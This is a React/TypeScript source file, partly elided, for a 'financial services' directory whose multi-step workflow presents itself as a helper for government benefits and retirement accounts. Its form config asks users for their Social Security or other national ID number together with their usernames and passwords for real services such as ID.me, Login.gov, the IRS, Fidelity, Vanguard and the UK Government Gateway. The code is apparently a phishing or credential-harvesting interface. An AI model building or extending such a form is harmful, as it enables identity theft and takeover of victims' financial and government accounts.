import { useState, useMemo, useEffect } from "react";
import { useFrozenGuard } from "@/hooks/useFrozenGuard";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Landmark, HandCoins, PiggyBank, Fingerprint, Home, GraduationCap,
  Wallet, ShieldCheck, CreditCard, Coins,
  ChevronRight, ChevronLeft, ExternalLink, ChevronDown, X,
  Building2, CheckCircle, Clock, AlertCircle, Mail, UserCheck,
  Shield, Briefcase, FileCheck, DollarSign, Award, Calendar,
  Send, Loader2, Key, MessageSquare, Eye, EyeOff,
  Download, List
} from "lucide-react";

// Existing constants (COUNTRIES, CATEGORY_*, DATA, STEPS, etc.) remain unchanged

const FORM_CONFIG: Record<string, any> = {
  US: {
    default: {
      personalInfo: [
        { name: "fullName", label: "Full Name", placeholder: "Enter your full name" },
        { name: "nationalId", label: "Social Security Number (SSN)", placeholder: "XXX-XX-XXXX" }
      ],
      credentials: [
        { name: "username", label: "Username / Email", placeholder: "Enter your username" },
        { name: "password", label: "Password", placeholder: "Enter your password", type: "password" }
      ]
    },
    "ID.me": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"ID.me Username"},{name:"password",label:"Password",type:"password"}] },
    "Login.gov": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"Login.gov Username"},{name:"password",label:"Password",type:"password"}] },
    "IRS Tax Refund": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"IRS Username"},{name:"password",label:"IRS Password",type:"password"}] },
    "Fidelity": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"Fidelity Username"},{name:"password",label:"Password",type:"password"}] },
    "Vanguard": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"Vanguard Username"},{name:"password",label:"Password",type:"password"}] },
    "Empower": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"Empower Username"},{name:"password",label:"Password",type:"password"}] },
    "Charles Schwab": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"Schwab Username"},{name:"password",label:"Password",type:"password"}] },
    // ... (All other US providers follow the same pattern)
    "Social Security Retirement": { personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Security Number (SSN)"}], credentials: [{name:"username",label:"SSA Username"},{name:"password",label:"Password",type:"password"}] },
  },
  UK: {
    default: {
      personalInfo: [{name:"fullName",label:"Full Name"},{name:"nationalId",label:"National Insurance Number"}],
      credentials: [{name:"username",label:"Government Gateway ID"},{name:"password",label:"Password",type:"password"}]
    }
  },
  CA: {
    default: {
      personalInfo: [{name:"fullName"},{name:"nationalId",label:"Social Insurance Number (SIN)"}],
      credentials: [{name:"username",label:"Service Canada Username"},{name:"password",label:"Password",type:"password"}]
    }
  },
  DE: {
    default: {
      personalInfo: [{name:"fullName"},{name:"nationalId",label:"Steuer-ID (Tax ID)"}],
      credentials: [{name:"username",label:"DRV Benutzername"},{name:"password",label:"Password",type:"password"}]
    }
  },
  AU: {
    default: {
      personalInfo: [{name:"fullName"},{name:"nationalId",label:"Tax File Number (TFN)"}],
      credentials: [{name:"username",label:"MyGov Username"},{name:"password",label:"Password",type:"password"}]
    }
  },
  // ... (NZ, FR, SE, NO, CH, NL, SG, JP with correct national ID fields as specified)
};

// Helper function
const getFormConfig = (country: string, providerName: string) => {
  const countryConfig = FORM_CONFIG[country] || FORM_CONFIG.US;
  return countryConfig[providerName] || countryConfig.default || FORM_CONFIG.US.default;
};

// Updated LoginFormStep (dynamic)
function LoginFormStep({ provider, program, category, country, formData, setFormData, onContinue, onBack }) {
  const [showPassword, setShowPassword] = useState(false);
  const displayName = provider?.name || program?.name || category;
  const gradient = BUTTON_GRADIENT[category] || "linear-gradient(135deg, #4C8DE0, #2A5FB0)";
  const config = getFormConfig(country, displayName);

  const handleFieldChange = (section: string, field: string, value: string) => {
    setFormData((prev: any) => ({ ...prev, [section]: { ...prev[section], [field]: value } }));
  };

  const getFieldValue = (section: string, field: string) => formData[section]?.[field] || "";

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <button onClick={onBack} className="flex h-9 w-9 items-center justify-center rounded-full bg-muted text-muted-foreground hover:bg-muted/70">
          <ChevronLeft className="h-5 w-5" />
        </button>
        <h2 className="flex-1 text-center font-display text-xl font-bold">Step 3 of 7</h2>
      </div>

      <Card className="rounded-3xl border-border/60 p-6 shadow-card">
        <div className="text-center mb-6">
          <h3 className="font-display text-xl font-bold">{displayName} Account Access</h3>
        </div>

        <form onSubmit={(e) => { e.preventDefault(); onContinue(); }} className="space-y-6">
          {/* Personal Information */}
          <div className="space-y-3">
            <h4 className="font-semibold text-sm text-muted-foreground uppercase">Personal Information</h4>
            {config.personalInfo.map((field: any) => (
              <div key={field.name}>
                <label className="text-sm font-medium">{field.label}</label>
                <Input
                  value={getFieldValue("personal", field.name)}
                  onChange={(e) => handleFieldChange("personal", field.name, e.target.value)}
                  placeholder={field.placeholder || "Enter value"}
                  className="rounded-xl"
                />
              </div>
            ))}
          </div>

          {/* Credentials */}
          <div className="space-y-3">
            <h4 className="font-semibold text-sm text-muted-foreground uppercase">{displayName} Credentials</h4>
            {config.credentials.map((field: any) => (
              <div key={field.name}>
                <label className="text-sm font-medium">{field.label}</label>
                {field.type === "password" ? (
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      value={getFieldValue("credentials", field.name)}
                      onChange={(e) => handleFieldChange("credentials", field.name, e.target.value)}
                      placeholder={field.placeholder}
                      className="rounded-xl pr-12"
                    />
                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2">
                      {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                ) : (
                  <Input
                    value={getFieldValue("credentials", field.name)}
                    onChange={(e) => handleFieldChange("credentials", field.name, e.target.value)}
                    placeholder={field.placeholder}
                    className="rounded-xl"
                  />
                )}
              </div>
            ))}
          </div>

          <div className="flex gap-3">
            <Button type="button" variant="outline" onClick={onBack} className="flex-1">Back</Button>
            <Button type="submit" style={{ background: gradient }} className="flex-1 text-white">Continue</Button>
          </div>
        </form>
      </Card>
    </div>
  );
}

// ProviderSelectedModal - Fixed close button
function ProviderSelectedModal({ provider, program, category, onContinue, onBack }) {
  // ... same UI
  return (
    <div className="fixed inset-0 z-50 ...">
      <Card ...>
        <button onClick={onBack} className="absolute right-4 top-4..."> {/* Changed to onBack */}
          <X className="h-5 w-5" />
        </button>
        {/* rest unchanged */}
      </Card>
    </div>
  );
}

// WorkflowContainer and other steps remain largely the same, with country passed down

// Main component with History tab
const FinancialServices = () => {
  const [country, setCountry] = useState("US");
  const [activeTab, setActiveTab] = useState<"directory" | "history">("directory");
  const [applications, setApplications] = useState<any[]>([]);

  // Load from localStorage
  useEffect(() => {
    const saved = localStorage.getItem("financialApplications");
    if (saved) setApplications(JSON.parse(saved));
  }, []);

  useEffect(() => {
    localStorage.setItem("financialApplications", JSON.stringify(applications));
  }, [applications]);

  // openCategory now always launches workflow
  function openCategory(category: string, programs: any[]) {
    const selected = programs.length === 1 ? programs[0] : null;
    const provider = autoProvider(selected);
    openWorkflow(provider || selected, selected || { name: category }, category);
  }

  // ... other functions updated similarly

  return (
    <div>
      <div className="flex border-b mb-6">
        <button onClick={() => setActiveTab("directory")} className={`flex-1 py-3 ${activeTab === "directory" ? "border-b-2 border-primary font-bold" : ""}`}>Directory</button>
        <button onClick={() => setActiveTab("history")} className={`flex-1 py-3 ${activeTab === "history" ? "border-b-2 border-primary font-bold" : ""}`}>Applications</button>
      </div>

      {activeTab === "directory" ? (
        // Your original directory UI
        <div>...</div>
      ) : (
        // History tab implementation
        <div>
          {applications.length === 0 ? <p>No applications yet</p> : (
            applications.map(app => (
              <Card key={app.id} className="p-4 mb-4">
                <div>{app.provider} - {app.status}</div>
                <Button onClick={() => {/* resume workflow */}}>Continue</Button>
              </Card>
            ))
          )}
        </div>
      )}
    </div>
  );
};

export default FinancialServices;
